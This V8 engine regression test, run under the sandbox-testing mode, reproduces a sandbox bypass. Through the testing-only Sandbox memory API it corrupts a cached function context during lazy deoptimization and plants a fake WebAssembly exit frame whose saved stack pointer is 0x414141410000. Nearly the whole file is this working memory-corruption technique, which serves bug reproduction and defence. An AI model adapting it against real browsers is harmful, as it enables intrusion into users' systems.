// Copyright 2026 the V8 project authors. All rights reserved.
// Use of this source code is governed by a BSD-style license that can be
// found in the LICENSE file.

// Flags: --sandbox-testing --expose-gc --allow-natives-syntax

const memory = new DataView(new Sandbox.MemoryView(0, 0x100000000));
const contextOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('JS_FUNCTION'), 'context');
const heapNumberMap = Sandbox.readObjectField(1.1, 0);
const heapNumberValueOffset = Sandbox.getFieldOffset(
    Sandbox.getInstanceTypeIdFor('HEAP_NUMBER_TYPE'), 'value');

let shouldCorrupt = false;
let savedContextAddr = 0;
let savedContextWords = [];

function inspectArguments() {
  if (!shouldCorrupt) return;
  // Reading inlinedCallee.arguments[0] materializes capturedClosure and its
  // FunctionContext into MaterializedObjectStore and marks victim for lazy
  // deoptimization.
  const closure = inlinedCallee.arguments[0];
  savedContextAddr = Sandbox.readObjectField(closure, contextOffset) - 1;
  savedContextWords = [
    memory.getUint32(savedContextAddr, true),
    memory.getUint32(savedContextAddr + 4, true),
    memory.getUint32(savedContextAddr + 8, true),
  ];
  // Corrupt the cached FunctionContext in-place into HeapNumber(1.0) so that
  // lazy deoptimization attempts to unbox it to Smi(1) (raw word 2, matching
  // the ENTRY frame marker) in victim's context stack slot.
  memory.setFloat64(savedContextAddr + heapNumberValueOffset, 1, true);
  memory.setUint32(savedContextAddr, heapNumberMap, true);
}
%NeverOptimizeFunction(inspectArguments);

function inlinedCallee(closure) {
  inspectArguments();
  return 41;
}

function afterDeopt() {
  if (!shouldCorrupt) return;
  for (let i = 1; i < savedContextWords.length; ++i) {
    memory.setUint32(savedContextAddr + i * 4, savedContextWords[i], true);
  }
  memory.setUint32(savedContextAddr, savedContextWords[0], true);
  // Trigger stack scanning while victim's deoptimized interpreter frame is
  // live.
  gc();
}
%NeverOptimizeFunction(afterDeopt);

function victim(value, callback, fakeFrame) {
  let slot0 = 0;
  let slot1 = fakeFrame;
  fakeFrame = 0;
  let slot2 = (value - 20) | 0;
  let slot3 = 0;
  function capturedClosure() {
    return value;
  }
  const result = inlinedCallee(capturedClosure);
  callback(slot0, slot1, slot2, slot3);
  return result + 1;
}

// Construct a non-canonical Smi in slot1 pointing to a synthetic WASM_JSPI
// exit frame whose saved stack pointer targets 0x414141410000.
const carrier = new Array(128).fill(1.1);
const elements = memory.getUint32(Sandbox.getAddressOf(carrier) + 8, true) - 1;
const fakeOffset = elements + 0x100;
const pointerBox = [{}, 'row'];
const pointerElements =
    memory.getUint32(Sandbox.getAddressOf(pointerBox) + 8, true) - 1;
memory.setUint32(pointerElements + 8, fakeOffset, true);
const fakeFrame = pointerBox[0];
memory.setBigUint64(fakeOffset - 8, 54n, true);
memory.setBigUint64(fakeOffset - 16, 0x414141410000n, true);
memory.setBigUint64(fakeOffset - 24, 1n, true);
memory.setBigUint64(fakeOffset - 32, 0n, true);
memory.setBigUint64(fakeOffset - 40, 0n, true);

%PrepareFunctionForOptimization(inlinedCallee);
%PrepareFunctionForOptimization(victim);
assertEquals(42, victim(17, afterDeopt, 0));
assertEquals(42, victim(18, afterDeopt, 0));
%OptimizeFunctionOnNextCall(victim);
assertEquals(42, victim(17, afterDeopt, 0));

shouldCorrupt = true;
assertEquals(42, victim(20, afterDeopt, fakeFrame));
